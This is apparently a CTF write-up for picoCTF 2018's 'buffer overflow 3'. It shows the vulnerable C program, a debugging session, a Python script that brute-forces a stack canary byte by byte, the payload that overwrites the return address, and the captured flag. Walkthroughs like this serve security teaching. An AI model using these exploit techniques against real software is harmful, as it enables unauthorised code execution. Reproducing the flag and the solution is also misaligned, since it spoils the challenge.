# [buffer overflow 3](https://2018game.picoctf.com/problems)

## Problem
It looks like Dr. Xernon added a stack canary to this [program](https://2018shell3.picoctf.com/static/ce00c0f7dc9cb4ddf31fbee32962841e/vuln) to protect against buffer overflows. Do you think you can bypass the protection and get the flag? You can find it in /problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf. [Source](https://2018shell3.picoctf.com/static/ce00c0f7dc9cb4ddf31fbee32962841e/vuln.c).

## Solution

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 32
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

this time we have to deal with a canary, that's read from the file "./canary.txt".

the program will ask us how many bytes to copy on the buffer, that's 32 bytes in size, and would then copy all of them in buf regardless of the defined size, so there's the obvious buffer overflow. the canary previously read from the file is close to the end of our buf, as we can see with a fast debugging session:

```
[andrei@jacky 22:59:51] ~/Documents/pico
——> echo BBBB > canary.txt
[andrei@jacky 23:00:10] ~/Documents/pico
——> xxd canary.txt
00000000: 4242 4242 0a                             BBBB.
[andrei@jacky 22:56:02] ~/Documents/pico
——> python2 -c "print('32\n' + 'A' * 32)" > input
[andrei@jacky 22:56:11] ~/Documents/pico
——> xxd input
00000000: 3332 0a41 4141 4141 4141 4141 4141 4141  32.AAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 410a                                AAA.
[andrei@jacky 22:56:13] ~/Documents/pico
——> cat r2profile
program=./vuln
stdin=input
[andrei@jacky 22:57:25] ~/Documents/pico
——> r2 -r r2profile -d ./vuln
Process with PID 21302 started...
= attach 21302 21302
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
 -- In radare we trust
[0xf7f660b0]> db 0x080488ad
[0xf7f660b0]> dc
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
hit breakpoint at: 80488ad
[0x080488ad]> px @esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xfff7e290  405d f2f7 58a0 0408 0400 0000 0100 0000  @]..X...........
0xfff7e2a0  0000 0000 2000 0000 3332 0af7 0000 0000  .... ...32......
0xfff7e2b0  f8e2 f7ff 90a2 f7f7 0400 0000 0000 0000  ................
0xfff7e2c0  244e f2f7 244e f2f7 4141 4141 4141 4141  $N..$N..AAAAAAAA
0xfff7e2d0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff7e2e0  4141 4141 4141 4141 4242 4242 0200 0000  AAAAAAAABBBB....
0xfff7e2f0  e803 0000 e803 0000 18e3 f7ff fe88 0408  ................
0xfff7e300  0100 0000 c4e3 f7ff cce3 f7ff e803 0000  ................
[0x080488ad]> dbt
0  0x80488ad  sp: 0x0         0    [sym.vuln]  eip sym.vuln+234
1  0xf7f7a290 sp: 0xfff7e2b4  36   [??]  map.usr_lib32_ld_2.28.so.r_x+82576
2  0x80488fe  sp: 0xfff7e2fc  72   [sym.main]  main+75
3  0xf7f7a290 sp: 0xfff7e384  136  [??]  map.usr_lib32_ld_2.28.so.r_x+82576
4  0x8048611  sp: 0xfff7e39c  24   [??]  entry0+33

```

here, i created the canary.txt file with 'BBBB' (= 0x42424242) as our stack canary. we can see it's right after the end of buf. examining the backtrace we can also see the value and position of the return address in the stack (0x80488fe  sp: 0xfff7e2fc); but to write on that position we overwrite the canary, so we need to find a way to leak it in order to write the same value in memory.

if we look at the source code we can see our input is copied on the stack with a call to ```read(0,buf,count);``` that doesn't write the NULL character at the end of the string, as opposed to say a scanf. this means we don't need to guess the entire 4 byte value, we can check for a byte at a time and have the program tell us if it's right with the output messages; that's 256 * 4 instead of 256 ^ 4 total tries, and even if it was to guess the entire value, being that it's read from a file and doesn't change every time the program is loaded again, that wouldn't be a problem anyway.

something like this horrible script will do the job

```
——> cat findcan.py
from subprocess import *
import struct

l = []

for j in range(0, 4):
    for i in range(0,256):
        p = Popen(['./vuln'], stdout = PIPE, stdin = PIPE)
        s = str(33 + j).encode() + b'\n' + b'A' * 32
        for e in l:
            s += struct.pack('B', e)
        s += struct.pack('B', i)
        p.stdin.write(s)
        p.stdin.flush()
        if b'Flag' in p.stdout.read():
            l.append(i)
            print(hex(i))
            break

[andrei@jacky 23:17:02] ~/Documents/pico
——> python findcan.py
0x42
0x42
0x42
0x42
```

this was executed locally, so on the server it would print the real canary value.

anyway, knowing the canary value we can easily overwrite the return address with the one of the win() function

```
xnand@pico-2018-shell-3:/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf$ python ~/findcan.py
0x49
0x48
0x77
0x6a
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) p win
$1 = {<text variable, no debug info>} 0x80486eb <win>
(gdb) q
xnand@pico-2018-shell-3:/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf$ ./vuln <<< $(python2 -c "print('88\n' + b'A'*61 + b'\x49\x48\x77\x6a' + 'B' * 16 + '\xeb\x86\x04\x08')")
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
picoCTF{eT_tU_bRuT3_F0Rc3_58bc7747}
Segmentation fault (core dumped)

```
